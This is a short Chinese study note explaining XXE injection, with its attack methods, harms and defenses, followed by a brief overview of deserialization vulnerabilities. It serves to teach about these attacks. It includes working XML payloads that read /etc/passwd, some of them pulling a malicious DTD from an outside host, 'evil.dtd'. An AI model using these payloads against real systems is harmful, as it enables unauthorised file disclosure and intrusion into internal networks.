### XXE是什么？攻击方法？危害？防御方法？
	1) XXE是什么？
		先了解，外部实体声明:<!ENTITY 实体名称 SYSTEM "URI">，示例如下：
```
		<?xml version="1.0"?>
		<!DOCTYPE test [
			<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
			<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
		]>
		<author>&writer;&copyright;</author>
```
		xxe也就是xml外部实体注入。
	2) XXE攻击方法
		a. 直接通过DTD外部实体声明
```
			<?xml version="1.0"?>
			<!DOCTYPE a [
				<!ENTITY b SYSTEM "file:///etc/passwd">
			]>
			<c>&b;</c>
```
		b. 通过DTD文档引入外部DTD文档，再引入外部实体声明
			XML内容：
```
			<?xml version="1.0"?>
			<!DOCTYPE a SYSTEM "http://mark4z5.com/evil.dtd">
			<c>&b;</c>
```
			DTD文件内容：
```
			<!ENTITY b SYSTEM "file:///etc/passwd">
```
		c. 通过DTD外部实体声明引入外部实体声明
			XML内容：
```
			<?xml version="1.0"?>
			<!DOCTYPE a [
				<!ENTITY % d SYSTEM "http://mark4z5.com/evil.dtd">
				%d;
			]>
			<c>&b;</c>
```
			DTD文件内容：
```
			<!ENTITY b SYSTEM "file:///etc/passwd">
```
	3) XXE危害
		a. 任意文件读取
		b. 执行系统命令
		c. 探测内网端口
		d. 攻击内网
	4) XXE防御方法
		a. 禁用外部实体声明
		b. 过滤关键词（<!DOCTYPE，<!ENTITY，SYSTEM等）
### 反序列化漏洞
##### 序列化和反序列化
1) 序列化：    	把Object转化成字节流，便于保存( eg. Java writeObject() )

2) 反序列化：	把字节流还原成Object ( eg. Java readObject() )
##### 反序列化漏洞
程序对于用户输入的进行反序列化处理，可能导致恶意payload导致的任意代码执行。
##### 影响
Java, PHP, Python等主流计算机语言都存在这种代码隐患。

